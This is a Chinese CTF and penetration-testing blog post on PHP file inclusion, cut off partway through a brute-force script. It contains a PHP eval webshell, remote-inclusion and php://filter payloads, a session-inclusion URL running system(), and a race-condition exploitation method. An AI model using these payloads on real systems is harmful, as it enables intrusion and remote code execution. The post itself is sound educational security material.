@@ -1,0 +1,686 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>PHP 文件包含漏洞 - Geekby&#39;s Blog</title><meta name="Description" content="PHP 文件包含漏洞相关"><meta property="og:title" content="PHP 文件包含漏洞" />
+<meta property="og:description" content="PHP 文件包含漏洞相关" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://www.geekby.site/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2019-05-30T16:20:00+08:00" />
+<meta property="article:modified_time" content="2019-05-30T16:20:00+08:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="PHP 文件包含漏洞"/>
+<meta name="twitter:description" content="PHP 文件包含漏洞相关"/>
+<meta name="application-name" content="Geekby&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Geekby&#39;s Blog"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://www.geekby.site/2019/05/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" /><link rel="prev" href="https://www.geekby.site/2019/05/ms14-068-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" /><link rel="next" href="https://www.geekby.site/2019/05/ctf%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "PHP 文件包含漏洞",
+        "inLanguage": "zh-cn",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/www.geekby.site\/2019\/05\/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/"
+        },"image": ["https:\/\/www.geekby.site\/logo.png"],"genre": "posts","keywords": "常用, CTF","wordcount":  766 ,
+        "url": "https:\/\/www.geekby.site\/2019\/05\/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E\/","datePublished": "2019-05-30T16:20:00+08:00","dateModified": "2019-05-30T16:20:00+08:00","publisher": {
+            "@type": "Organization",
+            "name": "Geekby","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/www.geekby.site\/images\/avatar.png",
+                    "width":  358 ,
+                    "height":  330 
+                }},"author": {
+                "@type": "Person",
+                "name": "Geekby"
+            },"description": "PHP 文件包含漏洞相关"
+    }
+    </script></head>
+    <body header-desktop="" header-mobile=""><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i> 文章 </a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i> 标签 </a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i> 分类 </a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i> 关于 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="输入关键字" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Geekby&#39;s Blog">Geekby&#39;s Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="输入关键字" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="文章"><i class="fas fa-inbox"></i>文章</a><a class="menu-item" href="/tags/" title="标签"><i class="fas fa-tags"></i>标签</a><a class="menu-item" href="/categories/" title="分类"><i class="fas fa-sort-amount-up-alt"></i>分类</a><a class="menu-item" href="/about/" title="关于"><i class="far fa-address-card"></i>关于</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">PHP 文件包含漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Geekby</a></span>&nbsp;<span class="post-category">收录于 <a href="/categories/%E5%B8%B8%E7%94%A8/"><i class="far fa-folder fa-fw"></i>常用</a>&nbsp;<a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><i class="far fa-folder fa-fw"></i>代码审计</a>&nbsp;<a href="/categories/ctf/"><i class="far fa-folder fa-fw"></i>CTF</a>&nbsp;<a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"><i class="far fa-folder fa-fw"></i>渗透测试</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2019-05-30">2019-05-30</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 766 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 4 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-相关函数">1 相关函数</a></li>
+    <li><a href="#2-分类">2 分类</a></li>
+    <li><a href="#3-包含的实现">3 包含的实现</a></li>
+    <li><a href="#4-包含的场景">4 包含的场景</a>
+      <ul>
+        <li><a href="#41-上传可控文件">4.1 上传可控文件</a></li>
+        <li><a href="#42-远程文件包含">4.2 远程文件包含</a>
+          <ul>
+            <li><a href="#421-条件">4.2.1 条件</a></li>
+            <li><a href="#422-远程文件包含">4.2.2 远程文件包含</a></li>
+          </ul>
+        </li>
+        <li><a href="#43-伪协议">4.3 伪协议</a>
+          <ul>
+            <li><a href="#431-php-归档">4.3.1 PHP 归档</a></li>
+            <li><a href="#432-利用-php-流">4.3.2 利用 PHP 流</a>
+              <ul>
+                <li><a href="#4321-phpfilter">4.3.2.1 php://filter</a></li>
+                <li><a href="#4322-phpinput">4.3.2.2 php://input</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#44-日志文件">4.4 日志文件</a></li>
+        <li><a href="#45-session">4.5 SESSION</a>
+          <ul>
+            <li><a href="#451-session-文件">4.5.1 session 文件</a></li>
+            <li><a href="#452-sessionupload">4.5.2 session.upload</a></li>
+          </ul>
+        </li>
+        <li><a href="#46--长文件名截断">4.6 ./ 长文件名截断</a></li>
+        <li><a href="#47-phpinfo">4.7 phpinfo</a></li>
+        <li><a href="#48-php-自包含">4.8 PHP 自包含</a></li>
+        <li><a href="#49-php-崩溃">4.9 PHP 崩溃</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-总结">5 总结</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="php-文件包含漏洞">PHP 文件包含漏洞</h1>
+<h2 id="1-相关函数">1 相关函数</h2>
+<ul>
+<li>include()</li>
+<li>include_once()</li>
+<li>require()</li>
+<li>require_once()</li>
+</ul>
+<h2 id="2-分类">2 分类</h2>
+<ul>
+<li>远程文件包含</li>
+<li>本地文件包含</li>
+</ul>
+<h2 id="3-包含的实现">3 包含的实现</h2>
+<blockquote>
+<p>包含的时候，不一定是要去包含 php 文件（即可执行的 php 文件）</p>
+</blockquote>
+<p>类似于：a.phps、a.xxx、a.jpg
+只要文件中包含一块完整 php 代码，例如一个 a.txt，内容为 <code>&lt;?php phpinfo();?&gt;</code></p>
+<h2 id="4-包含的场景">4 包含的场景</h2>
+<h3 id="41-上传可控文件">4.1 上传可控文件</h3>
+<ul>
+<li>比如说我们能够上传图片，那就去传一个带完整 php 代码的图片文件，或者是将代码文件改后缀即可</li>
+<li>压缩包，配合伪协议</li>
+</ul>
+<p><code>&lt;?php ?&gt;</code> 过滤的情况：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s2">&#34;php&#34;</span><span class="o">&gt;@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">]);</span><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="42-远程文件包含">4.2 远程文件包含</h3>
+<h4 id="421-条件">4.2.1 条件</h4>
+<p>allow_url_fopen</p>
+<blockquote>
+<p>本选项激活了 URL 形式的 fopen 封装协议使得可以访问 URL 对象例如文件。默认的封装协议提供用 ftp 和 http 协议来访问远程文件，一些扩展库例如 zlib 可能会注册更多的封装协议。</p>
+</blockquote>
+<h4 id="422-远程文件包含">4.2.2 远程文件包含</h4>
+<p><code>[http|https|ftp]://www.bbb.com/shell.txt</code>
+若后缀名写死，可以用 ? 绕过</p>
+<p>pyload:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">aaa.com/1.php?a
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="43-伪协议">4.3 伪协议</h3>
+<h4 id="431-php-归档">4.3.1 PHP 归档</h4>
+<ul>
+<li>phar://</li>
+<li>zip://</li>
+</ul>
+<p><strong>DEMO：</strong></p>
+<p><a href="http://106.12.37.37/index.php?url=upload" target="_blank" rel="noopener noreffer">http://106.12.37.37/index.php?url=upload</a></p>
+<p>payload：</p>
+<ul>
+<li>url=zip://a.zip#压缩包内文件名</li>
+<li>url=phar://a.zip/压缩包内文件名</li>
+<li>上传的文件无所谓后缀名，只要是 zip 文件头的文件均可，zip 文件改成 jpg，zip:// 协议仍然可以解析</li>
+</ul>
+<h4 id="432-利用-php-流">4.3.2 利用 PHP 流</h4>
+<h5 id="4321-phpfilter">4.3.2.1 php://filter</h5>
+<blockquote>
+<p>元封装器，设计用于数据流打开时的筛选过滤应用。这对于一体式(all-in-one)的文件函数非常有用，类似 readfile()、file() 和 file_get_contents()，在数据流内容读取之前没有机会应用其他过滤器。
+php://filter 目标使用以下的参数作为它路径的一部分。复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
+</blockquote>
+<ul>
+<li>?file=php://filter/read=convert.base64-encode/resource=index.php</li>
+<li>?file=php://filter/read=string.toupper|string.rot13/resource=index.php</li>
+</ul>
+<p>除此之外，还有：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">string.toupper                                     //上面有写
+string.tolower                                     //转换为小写
+string.strip_tags                                  //去除html和php标记，比如&lt;?php?&gt;
+convert.base64-encode                              //base64编码
+convert.base64-decode                              //base64编码
+convert.quoted-printable-encode                    //quoted-printable 转 8bit
+convert.quoted-printable-decode                    //同上
+</code></pre></td></tr></table>
+</div>
+</div><p>DEMO：</p>
+<p><a href="http://chinalover.sinaapp.com/web7/index.php" target="_blank" rel="noopener noreffer">http://chinalover.sinaapp.com/web7/index.php</a></p>
+<h5 id="4322-phpinput">4.3.2.2 php://input</h5>
+<ul>
+<li>利用条件
+<ul>
+<li>allow_url_include = On</li>
+<li>对 allow_url_fopen 不做要求</li>
+<li>php://input 可以读取没有处理过的 POST 数据</li>
+</ul>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113170721.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113170721.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113170721.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113170721.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113170721.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113170721.png-water_print" /></p>
+<p>Payload:</p>
+<p>Url：<code>?key=123&amp;flag=php://input</code></p>
+<p>Post：<code>123</code></p>
+<h3 id="44-日志文件">4.4 日志文件</h3>
+<blockquote>
+<p>很多时候，web 服务器会将请求写入到日志文件中，比如说 apache 在用户发起请求时，会将请求写入 access error.log。默认情况下，日志保存路径在 /var/log/apache2/</p>
+</blockquote>
+<p>www 用户无权限读取该日志，应用场景有限。</p>
+<h3 id="45-session">4.5 SESSION</h3>
+<p>PHP 默认生成的 session 文件往往存放在 /tmp 目录下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113171531.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113171531.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113171531.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113171531.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113171531.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20190113171531.png-water_print" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113171551.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113171551.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113171551.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113171551.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113171551.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113171551.png-water_print" /></p>
+<h4 id="451-session-文件">4.5.1 session 文件</h4>
+<p>注册一句话用户名，并包含 session 文件<code>http://512ab969d9ce414e9349e459f7bfe9d1b601c9951aa24093.changame.ichunqiu.com/action.php?module=&amp;file=../../../../../../../tmp/SESS/sess_tftrtvb6t089398jjl0p1cdvj7&amp;a=system(&quot;cat flag.php&quot;);</code></p>
+<hr>
+<h4 id="452-sessionupload">4.5.2 session.upload</h4>
+<p>session.upload_progress.enabled 这个参数在 php.ini 默认开启，需要手动配置为 OFF，如果不是 off，就会在上传的过程中生成上传进度文件，它的出现本是为了显示文件在上传时候的进度，以显示文件上传的信息。</p>
+<p>它的存储路径可以在 phpinfo 中获取到（如上图）</p>
+<p>Demo：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nx">_GET</span><span class="p">[</span><span class="s1">&#39;orange&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">@</span><span class="nx">substr</span><span class="p">(</span><span class="nx">file</span><span class="p">(</span><span class="nv">$_</span><span class="p">)[</span><span class="mi">0</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="mi">6</span><span class="p">)</span> <span class="o">===</span> <span class="s1">&#39;@&lt;?php&#39;</span> <span class="o">?</span> <span class="k">include</span><span class="p">(</span><span class="nv">$_</span><span class="p">)</span> <span class="o">:</span> <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>这个 session 文件并不一定要 <code>session_start</code> 才能生成，只要往服务器发送一个 <code>Cookie: PHPSESSID=xxx</code> 的值，然后用 session upload 的方式进行上传文件，就会生成这样一个 session 文件</p>
+<p>通过 curl 上传文件：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">curl http://IP/index.php -H <span class="s1">&#39;Cookie:PHPSESSID=iamnotorange&#39;</span> -F <span class="s1">&#39;PHP_SESSION_UPLOAD_PROGRESS=aaa&#39;</span> -F <span class="s1">&#39;file=@/etc/passwd&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>这样就可以控制文件名，接下来想办法控制文件内容。</p>
+<p>由于文件上传的速度比较快，有时候经常来不及看到保存在 session 文件中的 upload 信息，就会被删除。我们可以上传一个相对比较大的文件，并且条件竞争的方式。来先看一下保存在 session 中的文件内容。</p>
+<p>这里构造了一个这样的表单，upload.php</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;form action=&#34;upload.php&#34; method=&#34;POST&#34; enctype=&#34;multipart/form-data&#34;&gt;
+ &lt;input type=&#34;hidden&#34; name=&#34;&lt;?php echo ini_get(&#34;session.upload_progress.name&#34;); ?&gt;&#34; value=&#34;iamnotorange&#34; /&gt;
+ &lt;input type=&#34;file&#34; name=&#34;file1&#34; /&gt;
+ &lt;input type=&#34;file&#34; name=&#34;file2&#34; /&gt;
+ &lt;input type=&#34;submit&#34; /&gt;
+&lt;/form&gt;
+&lt;?php
+session_start();
+$name = ini_get(&#39;session.upload_progress.name&#39;);
+$key = ini_get(&#39;session.upload_progress.prefix&#39;) . $_POST[$name];
+var_dump($_SESSION[$key]); 
+include &#39;/var/lib/php/sessions/sess_iamnotorange&#39;;
+</code></pre></td></tr></table>
+</div>
+</div><p>然后开个多线程跑几次，就能看到通过条件竞争读出的文件内容：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113221506.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113221506.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113221506.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113221506.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113221506.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210113221506.png-water_print" /></p>
+<p>可以发现文件中的 <code>upload_progress_</code> 固定，不可控。</p>
+<p>接下来还有一个条件是 <code>substr(file($_)[0],0,6) === '@&lt;?php'</code>，想到利用 php 中的伪协议，进行文件内容的修改。</p>
+<p>参考：<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1" target="_blank" rel="noopener noreffer">https://www.leavesongs.com/PENETRATION/php-filter-magic.html#_1</a></p>
+<div class="details admonition info open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-info-circle fa-fw"></i>base64 的前置知识<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><p>base64编码后的字符串集为 [0-9a-zA-Z+/=]</p>
+<p>因而在解码的时候遇到这个之外的字符，就会跳过那些字符。只对在此范围内的字符进行解码。</p>
+<p>在本例中，<code>_</code> 作为特殊字符，在 base64 解码时会自动跳过。</p>
+</div>
+        </div>
+    </div>
+<p>所以只要对前面的 <code>upload_progress_</code> 进行足够多次的解密，就可以使其变成空字符</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="p">;</span>
+<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">){</span>
+    <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span> 
+    <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="nv">$data</span> <span class="o">==</span> <span class="s1">&#39;&#39;</span><span class="p">){</span>
+        <span class="k">echo</span> <span class="s2">&#34;一共解码了:&#34;</span><span class="o">.</span><span class="nv">$i</span><span class="p">,</span><span class="s2">&#34;次</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+        <span class="k">break</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>通过脚本可以看到，只要三次就可以将前面的内容转换为成空。</p>
+<p>但是，由于 base64 是对 4 个字符为一组进行解码。<code>upload_progress_ </code>并不满足三次解码后允许字符是 4 的倍数(14 个有效字符，要求有效字符至少是 16 个)，就会把后面的字符算入填充，从而破坏原有传入的 php 代码。</p>
+<div class="details admonition example open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-list-ol fa-fw"></i>示例<i class="details-icon fas fa-angle-right fa-fw"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">triple_base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+	<span class="k">return</span> <span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nx">base64_encode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)));</span>
+<span class="p">}</span>
+<span class="k">function</span> <span class="nf">triple_base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">){</span>
+	<span class="k">return</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)));</span>
+<span class="p">}</span>
+<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
+<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="o">.</span><span class="nx">triple_base64_encode</span><span class="p">(</span><span class="s2">&#34;&lt;?=\`id\`;&gt;&#34;</span><span class="p">);</span>
+
+<span class="k">echo</span> <span class="nx">triple_base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>解码之后的数据是 <code>?</code></p>
+<p>而 <code>upload_progress_ZZ </code>在三次的解码中，第一次解码后留下了四个允许字符<code>hikY</code>，第二次解码没有允许字符，第三次就变成了空。</p>
+<p>在这三次中，都是允许字符的数量都是 4 的倍数，这样就不会破坏后面传入的 php 代码。</p>
+</div>
+        </div>
+    </div>
+<p>爆破脚本：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+
+<span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz&#34;</span><span class="p">;</span>
+<span class="k">while</span><span class="p">(</span><span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+	<span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">;</span>
+	<span class="nv">$data</span> <span class="o">=</span> <span class="s2">&#34;upload_progress_&#34;</span><span class="o">.</span><span class="nx">substr</span><span class="p">(</span><span class="nx">str_shuffle</span><span class="p">(</span><span class="nv">$str</span><span class="p">),</span><span class="mi">10</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
+	<span class="nv">$s</span> <span class="o">=</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
+	<span class="nv">$s_length</span> <span class="o">=</span> <span class="nx">strlen</span><span class="p">(</span><span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;|[^a-z0-9A-Z+/]|s&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$s</span><span class="p">));</span>
